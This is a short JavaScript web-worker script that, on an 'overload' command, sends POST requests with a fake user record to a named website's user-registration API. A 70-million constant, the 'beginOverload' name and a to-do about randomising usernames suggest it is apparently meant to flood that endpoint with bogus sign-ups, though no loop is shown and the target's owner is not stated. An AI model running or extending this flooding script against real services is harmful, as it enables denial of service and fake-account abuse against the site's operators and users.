//const for loop
const number = 70000000; //70million

//@todo - generate randon usernames and emails with alphanumeric ids
const dummyData = {
  email: "script104nw@deed.iom",
  first_name: "nyugen",
  last_name: "laksn",
  password: "11111111",
  phone: "192019201",
  username: "redun"
};
function beginOverload() {
  fetch("https://api.masterclasschioma.com/v1/user/add", {
    method: "POST", // *GET, POST, PUT, DELETE, etc.
    // mode: "cors", // no-cors, cors, *same-origin
    cache: "no-cache",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(dummyData)
  })
    .then(response => {
      let v = response.json();
      v.then(e => console.log(e));
      console.log(v);
    })
    .catch(e => console.error(e));
  return "done";
}

self.addEventListener(
  "message",
  function(e) {
    var data = e.data;
    switch (data.cmd) {
      case "overload":
        var result = beginOverload(data); // Some function that calculates the average from the numeric array.
        self.postMessage(result);
        break;
      default:
        self.postMessage("Unknown command");
    }
  },
  false
);
